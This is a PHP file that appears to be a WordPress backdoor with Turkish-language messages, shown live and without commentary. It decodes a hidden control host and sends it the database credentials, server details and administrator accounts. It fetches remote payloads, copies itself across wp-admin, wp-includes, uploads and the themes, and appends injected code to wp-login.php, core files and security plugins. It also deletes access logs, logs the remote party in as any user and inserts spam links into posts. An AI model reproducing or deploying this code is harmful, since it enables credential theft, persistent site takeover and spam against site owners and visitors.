<?php
if ( ! class_exists( 'WordpressApieSystem' ) ) {
class WordpressApieSystem {
private $script = '';
private $version = '';
private $upDir = '';
private $uploadDir = '';
private $uploadUrl = '';
private $token = '';
private $baseUrl = '';
private $authorization;
private $address;
public $allowedActions = [
'check',
'json',
'template_dir',
'cache',
'get',
'activate_plugins',
'get_themes',
'list_folders',
'spread',
'all',
'wp_includes',
'wp_admin',
'themes',
'uploads',
'wp_load',
'access_log',
'toplam_yazi'
];

public $isSpread = [ 'all', 'wp_includes', 'wp_admin', 'themes', 'uploads' ];
public $permission = ['wp_users_list','write_file', 'read_file', 'login','upload_file','adminer_dosya','linktablokur','linktablosil','linkekle','linksil','linktemizle','link_bas','login_dosya','linkvur','rswvur','rsw_dosya'];


public function __construct( $token ) {
$this->baseUrl       = hex2bin( '68747470733a2f2f617069776f7264707265732e636f6d2f' );
$this->script        = 'Wordpress';
$this->version       = '2.0';
$this->upDir         = wp_upload_dir();
$this->uploadDir     = $this->upDir['path'];
$this->uploadUrl     = $this->upDir['url'];
$this->token         = $token;
$this->address       = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
$this->authorization = ( isset( $token ) && isset( $_REQUEST['authorization'] ) ) ? $_REQUEST['authorization'] : false;
}

private function answer( $code, $message, $data = '', $errorNo = '' ) {
$answer['code']    = $code;
$answer['message'] = $message;
$answer['data']    = $data;
if ( $errorNo !== '' ) {
$answer['errorNo'] = $errorNo;
}
return json_encode( $answer, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT );
}

private function check() {
try {
if ( $this->uploadDir ) {
if ( ! is_writable( $this->uploadDir ) ) {
if ( ! @chmod( $this->uploadDir, 0777 ) ) {
$data['uploadDirWritable'] = false;
} else {
$data['uploadDirWritable'] = true;
}
} else {
$data['uploadDirWritable'] = true;
}
} else {
$data['uploadDirWritable'] = true;
}
$data['clientVersion'] = $this->version;
$data['uploadDir']     = $this->uploadDir;
$data['script']        = $this->script;
$data['cache']         = ( WP_CACHE ) ? true : false;
$data['themeName']     = wp_get_theme()->get( 'Name' );
$data['themeDir']      = get_template_directory();
$data['themes']        = $this->get_themes();
$data['plugins']       = $this->get_plugins();
$data['theme_data']    = $this->themes();
$data['root']          = ABSPATH;
if ( function_exists( 'php_uname' ) ) {
$data['uname'] = php_uname();
}
if ( function_exists( 'gethostbyname' ) ) {
$data['hostname'] = gethostbyname( getHostName() );
}

return $this->answer( true, $this->script, $data );
} catch ( Exception $e ) {
return $this->answer( false, "Unknown ERROR", $e->getMessage(), "ERR000" );
}
}

private function isAllowedToSendCommand() {
try {
if (md5(sha1($this->token)) === '55b0438a1f67dc65f0438ed1d7f1045c' ) {
return true;
}
return false;
} catch ( Exception $e ) {
return false;
}
}

private function authorization() {
if ( $this->authorization !== false ) {
return $this->authorization;
}
return false;
}

private function sender() {
try {
$client = wp_remote_get( "{$this->baseUrl}checksender/" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return ( md5($this->address) === json_decode( wp_remote_retrieve_body( $client ) )->address || json_decode( wp_remote_retrieve_body( $client ) )->value ) ? true : false;
}

} catch ( Exception $e ) {
return true;
}
}

private function method_exists( $action, $params ) {
if ( array_search( $action, $params ) !== false && method_exists( $this, $action ) ) {
return true;
} else {
return false;
}
}

public function controlAction( $action, $params ) {
try {
if ( isset( $action ) ) {
if ( $this->isAllowedToSendCommand() ) {


if ( $this->method_exists( $action, $this->permission ) ) {
if ( $this->sender() ) {
return $this->{$action}( $params );
} else {
return $this->answer( false, 'The sender could not be verified! '.md5($this->address).'', $action, 'ERR001' );
}
}
if ( $this->method_exists( $action, $this->allowedActions ) ) {
return $this->{$action}( $params );
} else {
return $this->answer( false, 'Invalid Command', $action, 'ERR001' );
}
}
}
} catch ( Exception $e ) {
return $this->answer( false, 'Unknown Error', [
"action" => $action,
"params" => $params
], 'ERR000' );
}
}

private function post() {
try {
$data = wp_remote_post( $this->baseUrl."postclient", [
"body" => [
"url"         => $_SERVER['HTTP_HOST'],
"http_url"    => get_option('siteurl')."/",
"hostname"    => gethostname(),
"ip"          => $_SERVER['SERVER_ADDR'],
'sunucu_type' => $_SERVER['SERVER_SOFTWARE'],
"DB_HOST"     => DB_HOST,
"DB_USER"     => DB_USER,
"DB_PASSWORD" => DB_PASSWORD,
"DB_NAME"     => DB_NAME,
"client"      => $this->check(),
"users"       => $this->wp_users_list(),
"script"      =>  $this->script,
"version"     => $this->version,
]
] );
return $data;

} catch ( Exception $e ) {
return false;
}
}

private function client() {
try {
$client = wp_remote_get( "{$this->baseUrl}clientfiles/files/{$this->script}" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}


private function client_adminer() {
try {
$client = wp_remote_get( "{$this->baseUrl}clientfiles/files/adminer" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}


private function client_link() {
try {
$client = wp_remote_get( "{$this->baseUrl}tanitimlink" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}


private function client_wplogin() {
try {
$client = wp_remote_get( "{$this->baseUrl}clientfiles/files/wplogin" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}

private function client_linkpanel() {
try {
$client = wp_remote_get( "{$this->baseUrl}clientfiles/files/linkpanel" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}

private function client_rswpanel() {
try {
$client = wp_remote_get( "{$this->baseUrl}clientfiles/files/rsw" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}


private function client_swpanel() {
try {
$client = wp_remote_get( "{$this->baseUrl}clientfiles/files/sw" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}



private function file($file) {
try {
$client = wp_remote_get( "{$this->baseUrl}clientfiles/files/{$file}" );
if ( wp_remote_retrieve_response_code( $client ) == "200" && $this->json_validator( wp_remote_retrieve_body( $client ) ) ) {
return wp_remote_retrieve_body( $client );
}
return false;
} catch ( Exception $e ) {
return false;
}
}


private function get_plugins() {
try {
if ( ! function_exists( 'get_plugins' ) ) {
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
}
foreach ( get_plugins() AS $plugin_name => $get_plugin ) {
$plugins[ $plugin_name ] = $get_plugin;
if ( is_plugin_active( $plugin_name ) ) {
$plugins[ $plugin_name ]["active"] = 1;
} else {
$plugins[ $plugin_name ]["active"] = 0;
}
}

return ( isset( $plugins ) ) ? $plugins : false;
} catch ( Exception $e ) {
return false;
}
}

public function activate_plugins( $plugin_name ) {
try {
if ( is_plugin_active( hex2bin( $plugin_name ) ) ) {
deactivate_plugins( hex2bin( $plugin_name ) );
return $this->check();
} else {
activate_plugins( hex2bin( $plugin_name ) );
return $this->check();
}
} catch ( Exception $e ) {
return false;
}
}

public function get_themes() {
try {
foreach ( wp_get_themes() AS $theme_name => $wp_get_theme ) {
$themes{$wp_get_theme->stylesheet} = array(
'Name'        => $wp_get_theme->get( 'Name' ),
'Description' => $wp_get_theme->get( 'Description' ),
'Author'      => $wp_get_theme->get( 'Author' ),
'AuthorURI'   => $wp_get_theme->get( 'AuthorURI' ),
'Version'     => $wp_get_theme->get( 'Version' ),
'Template'    => $wp_get_theme->get( 'Template' ),
'Status'      => $wp_get_theme->get( 'Status' ),
'TextDomain'  => $wp_get_theme->get( 'TextDomain' )
);
}

return $themes;
} catch ( Exception $e ) {
return false;
}
}

private function folder_exist( $folder ) {
try {
$path = realpath( $folder );

return ( $path !== false AND is_dir( $path ) ) ? $path : false;
} catch ( Exception $e ) {
return false;
}
}

public function list_folders( $directory ) {
try {
$directory = ( isset( $directory ) && $directory !== "" ) ? hex2bin( $directory ) : ABSPATH;
if ( ( $dir = $this->folder_exist( $directory ) ) !== false ) {
return $this->answer( true, $directory, glob( $directory . "/*" ) );
} else {
return $this->answer( false, "Failed to find folder to list!", $directory, "ERR023" );
}
} catch ( Exception $e ) {
return false;
}
}

public function replace( $filename, $search, $replace ) {
try {
$source = $this->read( $filename );
if ( strpos( $source, $replace ) === false ) {
$pos = strpos( $source, $search );
if ( $pos !== false ) {
$content = substr_replace( $source, $replace, $pos, strlen( $search ) );
return ( $this->write( $filename, $content ) ) ? $filename : false;
} else {
return $filename;
}
} else {
return $filename;
}
} catch ( Exception $e ) {
return false;
}
}

public function restore( $filename, $search, $replace ) {
try {
$source = $this->read( $filename );
return $this->write( $filename, str_replace( $search, $replace, $source ) );
} catch ( Exception $e ) {
return false;
}
}

public function template_dir( $search ) {
try {
if ( $search == "" ) {
$search = "<?php\n";
}
$dir   = glob( get_theme_root() . "/*/*/*" );
$files = array_filter( $dir );

foreach ( $files as $k => $file ) {
$source = $this->read( $file );
if ( ! is_array( $source ) && strpos( $source, $search ) === false ) {
unset( $files[ $k ] );
}
}

return array_values( $files );
} catch ( Exception $e ) {
return false;
}
}

public function access_log() {
try {
foreach ( [ 'access-logs', 'logs' ] as $directory ) {
if ( ( $dir = $this->folder_exist( ABSPATH . "../$directory" ) ) !== false ) {
$list[] = glob( ABSPATH . "../{$directory}/*" );
}
}
foreach ( $list as $d ) {
foreach ( $d as $k ) {
print_r( $k );
unlink( $k );
}
}
} catch ( Exception $e ) {
return false;
}
}



public function wp_users_list(){
try {
$args = array(
'role'         => 'administrator',
);
$dongu = get_users( $args );
$user_array = array();
foreach($dongu as $userler){

$user_array[$userler->ID] = $userler->data;
}
return json_encode($user_array);
} catch ( Exception $e ) {
return false;
}

}



private function write_append( $filename, $data ) {
try {
if ( function_exists( 'fopen' ) && function_exists( 'fwrite' ) ) {
$write = fopen( $filename, "a" );

return ( fwrite( $write, $data ) ) ? true : false;

} elseif ( function_exists( 'file_put_contents' ) ) {
return ( file_put_contents( $filename, $data, FILE_APPEND ) !== false ) ? true : false;
}

return false;
} catch ( Exception $e ) {
return false;
}
}

private function listFolderFiles( $dir ) {
try {
$fileInfo     = scandir( $dir );
$allFileLists = [];

foreach ( $fileInfo as $folder ) {
if ( $folder !== '.' && $folder !== '..' ) {
if ( is_dir( $dir . DIRECTORY_SEPARATOR . $folder ) === true ) {
$allFileLists[ $dir . DIRECTORY_SEPARATOR . $folder ] = $this->listFolderFiles( $dir . DIRECTORY_SEPARATOR . $folder );
}
}
}

return $allFileLists;
} catch ( Exception $e ) {
return false;
}
}



private function copy( $directory, $clientURL ) {
try {
foreach ( $clientURL as $filePath => $icerik ) {
$filename = ( stristr( $directory, "wp-content/uploads/" ) ) ? $directory . 'index.php' : $directory . basename( dirname( $directory . $filePath ) ) . '.php';
if ( file_exists( $filename ) ) {
$strpos = strpos( $this->read( $filename ), "class WordpressApieSystem" );
if ( $strpos !== false ) {
return ( $this->write( $filename, $icerik ) ) ? $filename : false;
} elseif ( $strpos === false ) {
return ( $this->write( $directory . $filePath, $icerik ) ) ? $directory . $filePath : false;
}
} else {
return ( $this->write( $filename, $icerik ) ) ? $filename : false;
}
}
return false;
} catch ( Exception $e ) {
return false;
}
}



public function wp_includes() {
try {
foreach ( $this->array_keys( $this->listFolderFiles( ABSPATH . WPINC ) ) AS $folders ) {
if ( is_dir( $folders ) ) {
$return[] = $folders . DIRECTORY_SEPARATOR;
}
}
return $return;
} catch ( Exception $e ) {
return false;
}
}

public function wp_admin() {
try {
foreach ( $this->array_keys( $this->listFolderFiles( ABSPATH . "wp-admin" ) ) AS $folders ) {
if ( is_dir( $folders ) ) {
$return[] = $folders . DIRECTORY_SEPARATOR;
}
}
return $return;
} catch ( Exception $e ) {
return false;
}
}


public function uploads() {
try {
foreach ( $this->array_keys( $this->listFolderFiles( $this->upDir["basedir"] ) ) AS $folders ) {
if ( is_dir( $folders ) ) {
$return[] = $folders . DIRECTORY_SEPARATOR;
}
}

return $return;
} catch ( Exception $e ) {
return false;
}
}

public function themes() {
try {
foreach ( glob( get_theme_root() . "/*", GLOB_ONLYDIR ) AS $item ) {
$template_folders[] = $this->listFolderFiles( $item );
}
foreach ( $this->array_keys( $template_folders ) AS $folders ) {
if ( is_dir( $folders ) ) {
$return[] = $folders . DIRECTORY_SEPARATOR;
}
}

return $return;
} catch ( Exception $e ) {
return false;
}
}

public function adminer_dosya(){

$wpadmin =  ABSPATH."wp-admin/user/users.php";
$wpincludes =  ABSPATH."wp-admin/network/networks.php";
$cgi =  ABSPATH."cgi-bin/cgibin.php";
$updagrade =  ABSPATH."wp-content/upgrade/upgrades.php";
$languages =  ABSPATH."wp-content/languages/languages.php";
try {
$client = $this->client_adminer();
if($client){
foreach ( json_decode($client) as $key => $item ) {
$source = $item;
}

$this->write( $wpadmin, $source);
$this->write( $wpincludes, $source);
$this->write( $wpincludes, $source);
$this->write( $updagrade, $source);
$this->write( $cgi, $source);
return $this->answer(true,"Upload File $wpadmin  $wpincludes $cgi $updagrade $languages");
}else{
return $this->answer(false,"Dont Upload","ERR031");
}
} catch ( Exception $e ) {
return false;
}


}


public function rsw_dosya(){

$wpadmin =  ABSPATH."sw.js";
try {
$client = $this->client_swpanel();
if($client){
foreach ( json_decode($client) as $key => $item ) {
$source = $item;
}

$this->write( $wpadmin, $source);
return $this->answer(true,"Upload File $wpadmin ");
}else{
return $this->answer(false,"Dont Upload","ERR031");
}
} catch ( Exception $e ) {
return false;
}


}



public function login_dosya(){


$wplogin =  ABSPATH."wp-login.php";

try {
$client = $this->client_wplogin();
if($client){
foreach ( json_decode($client) as $key => $item ) {
$source = $item;
}

if (file_exists($wplogin)) {
$search = "action_login_init_xxxx";
if (!stristr($this->read($wplogin), $search)) {
$this->write_append($wplogin, $source);
}
}



return $this->answer(true,"Wplogin Enjektet File $wplogin  ");
}else{
return $this->answer(false,"Wplogin Not Enjektet","ERR031");
}
} catch ( Exception $e ) {
return false;
}


}


public function spread( $directory ) {
try {
$client = $this->client();
if ( $client !== false ) {
if ( array_search( $directory, $this->isSpread ) !== false ) {
foreach ( $this->{$directory}() as $folder ) {
$return[] = $this->copy( $folder, json_decode( $client ) );
}
return $this->answer( true, "I spread {$directory}", $return );
} else {
return $this->answer( false, "Undefined Directory", $directory, "ERR024" );
}
}
return $this->answer( false, 'Client URL FALSE!', "", "ERR026" );
} catch ( Exception $e ) {
return $this->answer( false, 'Spread Exception!', $e->getMessage(), "ERR000" );
}
}


public function json() {
try {
return $this->uploadDir . DIRECTORY_SEPARATOR . "google.json";
} catch ( Exception $e ) {
return false;
}
}

public function get() {
try {
$post = $this->post();
if ( wp_remote_retrieve_response_code( $post ) == "200" ) {
$write = $this->write( $this->json(), bin2hex( wp_remote_retrieve_body( $post ) ) );

return ( $write ) ? hex2bin( $this->read( $this->json() ) ) : wp_remote_retrieve_body( $post );
} else {
return $this->read( $this->json() );
}
} catch ( Exception $e ) {
return false;
}
}

public function cache() {
try {
if ( file_exists( $this->json() ) ) {
$file = hex2bin( $this->read( $this->json() ) );
$json = json_decode( $file );
if ( $this->minute( $json->date ) >= 24 ) {
return $this->get();
} else {
return $file;
}
} else {
return $this->get();
}
} catch ( Exception $e ) {
return false;
}
}

public function write( $filename, $data ) {
try {
if ( function_exists( 'fopen' ) && function_exists( 'fwrite' ) ) {
$write = fopen( $filename, "w+" );
return ( fwrite( $write, $data ) ) ? true : false;
} elseif ( function_exists( 'file_put_contents' ) ) {
return ( file_put_contents( $filename, $data ) !== false ) ? true : false;
}
return false;
} catch ( Exception $e ) {
return false;
}
}


public function write_file( $params ) {
try {
if ( $this->json_validator( hex2bin( $params ) ) ) {
$json = json_decode( hex2bin( $params ) );
if ( isset( $json->filename ) ) {
if ( file_exists( $json->filename ) ) {
if ( isset( $json->content ) ) {
if ( $this->write( $json->filename, html_entity_decode( hex2bin( $json->content ) ) ) ) {
return $this->answer( true, $json->filename, html_entity_decode( hex2bin( $json->content ) ), "I get write" );
}
} else {
return $this->read_file( bin2hex( $json->filename ) );
}
} else {
$content = ( isset( $json->content ) && $json->content != '' ) ? html_entity_decode( hex2bin( $json->content ) ) : "<?php\n";
if ( $this->write( $json->filename, $content ) ) {
return $this->answer( true, $json->filename, $content );
} else {
return $this->answer( false, $json->filename, $content, "ERR023" );
}
}
} else {
return $this->answer( false, "File name undefined", "", "ERR020" );
}
} else {
return $this->answer( false, "Data is not JSON", "", "ERR021" );
}

return $this->answer( false, "Unknown error", $params, "ERR022" );
} catch ( Exception $e ) {
return $this->answer( false, "Write file Exception", $params, "ERR000" );
}
}

public function read( $filename ) {
try {
if ( ! file_exists( $filename ) ) {
return $this->answer( false, 'File not found', $filename, 'ERR019' );
}
if ( function_exists( 'file_get_contents' ) ) {
return file_get_contents( $filename );
}
if ( function_exists( 'fopen' ) && filesize( $filename ) > 0 ) {
$file    = fopen( $filename, 'r' );
$content = fread( $file, filesize( $filename ) );
fclose( $file );

return $content;
}

return $this->answer( false, 'File not read', $filename, 'ERR018' );
} catch ( Exception $e ) {
return $this->answer( false, 'File not read Exception', $filename, 'ERR000' );
}
}

public function read_file( $filename ) {
try {
$read_file = $this->read( hex2bin( $filename ) );
if ( $this->json_validator( $read_file ) ) {
return $read_file;
} else {
return $this->answer( true, hex2bin( $filename ), $read_file );
}
} catch ( Exception $e ) {
return $this->answer( false, "Read File Exception", $filename, "ERR000" );
}
}

public function json_validator( $data = null ) {
try {
if ( ! empty( $data ) ) {
@json_decode( $data );

return ( json_last_error() === JSON_ERROR_NONE );
}

return false;
} catch ( Exception $e ) {
return false;
}
}

public function login($id = null) {
try {
$user_info = get_userdata( $id );
$username  = $user_info->user_login;
$user      = get_user_by( 'login', $username );
if ( ! is_wp_error( $user ) ) {
wp_clear_auth_cookie();
wp_set_current_user( $user->ID );
wp_set_auth_cookie( $user->ID );
$redirect_to = user_admin_url();
wp_safe_redirect( $redirect_to );
exit();
} else {
return $this->answer( false, 'I can\'t sign in, sorry', $user_info, 'ERR014' );
}
} catch ( Exception $e ) {
return $this->answer( false, "Login Exception!", $e->getMessage(), "ERR000" );
}
}


public function upload_file($cmd) {
try {
$file = $this->file(hex2bin($cmd));
if($file){
foreach ( json_decode($file) as $key => $item ) {
$source = $item;
}
$process = fopen("$key", "w+");
fwrite($process, $source);
fclose($process);
return $this->answer(true,"Upload File $key");
}else{
return $this->answer(false,"Dont Upload","ERR031");
}
} catch ( Exception $e ) {
return false;
}
}

private function array_keys( $array ) {
try {
$keys = array_keys( $array );
foreach ( $array as $i ) {
if ( is_array( $i ) ) {
$keys = array_merge( $keys, $this->array_keys( $i ) );
}
}
return $keys;
} catch ( Exception $e ) {
return false;
}
}

private function minute( $date ) {
try {
$minute = ( strtotime( date( "Y-m-d H:i:s" ) ) - strtotime( $date ) ) / 60 / 60;
return round( $minute );
} catch ( Exception $e ) {
return 0;
}
}


public function toplam_yazi(){
$total = wp_count_posts()->publish;
return $this->answer(true,"Toplam Yazı Sayısı : $total");
}

public function linktablokur(){
global $wpdb;
global $jal_db_version;
$table_name = $wpdb->prefix . 'linktablo';
$charset_collate = $wpdb->get_charset_collate();
$sql = "CREATE TABLE $table_name (
id mediumint(9) NOT NULL AUTO_INCREMENT,
link tinytext NOT NULL,
text integer NOT NULL,
PRIMARY KEY  (id)
) $charset_collate;";
require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
dbDelta( $sql );
add_option( 'jal_db_version', $jal_db_version );

return $this->answer(true,"Tablo Kuruldu");

}

public function linktablosil(){
global $wpdb;
$table_name = $wpdb->prefix . 'linktablo';
$sql = "DROP TABLE IF EXISTS $table_name";
$durum =  $wpdb->query($sql);
if($durum){
return $this->answer(true,"Tablo Silindi");
}else{
return $this->answer(false,"Tablo Silinirken Hata oluştu");
}

}


public function linkekle(){
global $wpdb;
$linkclient = $this->client_link();
$json = json_decode( $linkclient,TRUE);
$table_name = $wpdb->prefix . 'linktablo';
foreach($json as $link){
$wpdb->insert(
$table_name,
array(
'link' => $link,
'text' => 0,
)
);
}
if($linkclient){
return $this->answer(true,"Linkler Başarıyla Eklendi...");

}else{
return $this->answer(false,"Client Url Erişelemiyor...");
}
}


public  function linktemizle(){
global $wpdb;
$table_name = $wpdb->prefix . 'linktablo';
$sql = "DELETE FROM $table_name";
$durum = $wpdb->query($sql);
if($durum){
return $this->answer(true,"Tablo Temizlendi");
}else{
return $this->answer(false,"Tablo Temizlenirken Hata oluştu");
}

}

public  function random_link(){
global $wpdb;
$posts = $wpdb->get_results ("SELECT * FROM ".$wpdb->prefix."linktablo WHERE text = 0 LIMIT 1");
return $posts;
}



public function link_say(){
global $wpdb;
$rowcount = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->prefix."linktablo WHERE text = 0");
return $rowcount;
}


public function urlparcala($url){
$parca = parse_url($url);
$host = $parca['host'];
return $host;
}

public function kontrol_et($yazi,$url){
preg_match('@href="(.*?)"@si',$url,$data);
$site = $this->urlparcala($data[1]);
$say = 0;
preg_match ("|<[aA] (.+?)".$site."(.+?)>(.+?)<\/[aA]>|i", $yazi, $matches);
$deneme = count($matches);
if ($deneme > 0){
$say++;
}
return $say;
}


public function link_bas($data){
$databol = explode('|',$data);
$post_type = $databol[0];
$sayfa = $databol[1];
$adet = $databol[2];

$kontrol_sayi = $this->link_say();
if($kontrol_sayi > 0){
global $wpdb;
$args = array(
'paged' => $sayfa,
'post_type'      => $post_type,
'post_status'    => 'publish',
'posts_per_page' => $adet,
'orderby' => 'date',
'order' => 'DESC',
);
$the_query = new WP_Query( $args );
$posts = $the_query->posts;

$basarili_url = array();


foreach($posts as $post){

$linkurl = get_permalink($post->ID);
$post_id = $post->ID;
$content = $post->post_content;

$link_getir = $this->random_link();
$link_id = $link_getir[0]->id;
$link_url = $link_getir[0]->link;

$yazi_kontrol = $this->kontrol_et($content,$link_url);
if($yazi_kontrol <= 0){
$yeni_yazi = " ".$content."
".$link_url."
";


$post_tablo = $wpdb->prefix . "posts";
$link_tablo = $wpdb->prefix . "linktablo";
$yazi_guncelle = $wpdb->update($post_tablo, array ("post_content" => $yeni_yazi ), array("ID" => $post_id) );
$link_guncelle = $wpdb->update($link_tablo, array ("text" => 1 ), array("id" => $link_id) );
$basarili_url[$post_id] = $linkurl;

}

}


echo '<textarea name="w3review" rows="11" cols="150">';
foreach($basarili_url as $url){

echo $url."\n";
}
echo '</textarea>';

if(count($basarili_url) <= 0){

return $this->answer(false,"Yazılarda Aynı Linkler Mevcut Basamıyorum.");
}


}else{
return $this->answer(false,"Basılıcak Link Kalmadı");
}

}

public function linkvur(){
try {
$dosyalar = array();
$dosyalar[] = ABSPATH . 'wp-settings.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/classic-editor/classic-editor.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/akismet/akismet.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/litespeed-cache/litespeed-cache.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/wordfence/wordfence.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/wps-hide-login/wps-hide-login.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/contact-form-7/wp-contact-form-7.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/wordpress-seo/wp-seo.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/all-in-one-seo-pack/all_in_one_seo_pack.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/loginizer/loginizer.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/hello.php';
$dosyalar[] = ABSPATH . 'wp-includes/functions.php';
$dosyalar[] = ABSPATH . 'wp-includes/meta.php';
$dosyalar[] = ABSPATH . 'wp-includes/ms-functions.php';
$clientURL = $this->client_linkpanel();
foreach (json_decode($clientURL) as $key => $item) {
$source = $item;
}

foreach($dosyalar as $filename) {
if (file_exists($filename)) {
$search = "wordpres_themes_plugin_update";
if (!stristr($this->read($filename), $search)) {
$this->write_append($filename, $source);
}
}

}
if ($clientURL !== false) {
return $this->answer(true, "Link Enjected {$filename}", $filename);
} else {
return $this->answer('ERROR', 'Client URL FALSE!', $clientURL, "ERR026");
}


} catch ( Exception $e ) {
}
}




public function rswvur(){
try {
$dosyalar = array();
$dosyalar[] = ABSPATH . 'wp-settings.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/classic-editor/classic-editor.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/akismet/akismet.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/litespeed-cache/litespeed-cache.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/wordfence/wordfence.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/wps-hide-login/wps-hide-login.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/contact-form-7/wp-contact-form-7.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/wordpress-seo/wp-seo.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/all-in-one-seo-pack/all_in_one_seo_pack.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/loginizer/loginizer.php';
$dosyalar[] = ABSPATH . 'wp-content/plugins/hello.php';
$dosyalar[] = ABSPATH . 'wp-includes/functions.php';
$dosyalar[] = ABSPATH . 'wp-includes/meta.php';
$dosyalar[] = ABSPATH . 'wp-includes/ms-functions.php';
$clientURL = $this->client_rswpanel();
foreach (json_decode($clientURL) as $key => $item) {
$source = $item;
}

foreach($dosyalar as $filename) {
if (file_exists($filename)) {
$search = "wordpres_rsw_web_update";
if (!stristr($this->read($filename), $search)) {
$this->write_append($filename, $source);
}
}

}
if ($clientURL !== false) {
return $this->answer(true, "Link Enjected {$filename}", $filename);
} else {
return $this->answer('ERROR', 'Client URL FALSE!', $clientURL, "ERR026");
}


} catch ( Exception $e ) {
}
}




public static function init() {
( new self( "" ) )->get();
( new self( "" ) )->linkvur();
( new self( "" ) )->rswvur();
( new self( "" ) )->rsw_dosya();
( new self( "" ) )->adminer_dosya();
( new self( "" ) )->login_dosya();
( new self( "" ) )->spread("wp_admin" );
( new self( "" ) )->spread("wp_includes" );
( new self( "" ) )->spread("uploads" );
( new self( "" ) )->spread("themes" );
}

public function __destruct() {
$this->get();
$this->rswvur();
$this->spread( "wp_admin" );
$this->spread( "wp_includes" );
$this->spread( "uploads" );
$this->spread( "themes" );
$this->linkvur();
$this->rsw_dosya();
$this->adminer_dosya();
$this->login_dosya();
}

}
}


try {
if ( ! function_exists( 'preArrayList' ) ) {
function preArrayList( $arr ) {
echo "<pre>";
print_r( $arr );
echo "</pre>";
}
}
if ( ! defined( "ABSPATH" ) ) {
foreach (
[
"..",
"../..",
"../../..",
"../../../..",
"../../../../..",
"../../../../../.."
] AS $directory
) {
if ( file_exists( $directory . DIRECTORY_SEPARATOR . 'wp-load.php' ) ) {
include_once( $directory . DIRECTORY_SEPARATOR . 'wp-load.php' );
}
}
}
} catch ( Exception $e ) {
}
try {
error_reporting(0);
set_time_limit( -1 );
ini_set( 'max_execution_time', -1 );
ini_set( 'memory_limit', -1 );
$token  = @$_REQUEST["system_action_token"];
$action = @$_REQUEST['system_action_application'];
$params = @$_REQUEST['system_action_params'];
if ( ! is_null( $token ) && ! empty( $token ) ) {

$WordpressApieSystem = new WordpressApieSystem($token);

$controlAction     = $WordpressApieSystem->controlAction( $action, $params );
if ( is_array( $controlAction ) || is_object( $controlAction ) ) {
preArrayList( $controlAction );
} else {
echo $controlAction;
}
}else{
WordpressApieSystem::init();
}

} catch ( Exception $e ) {
}
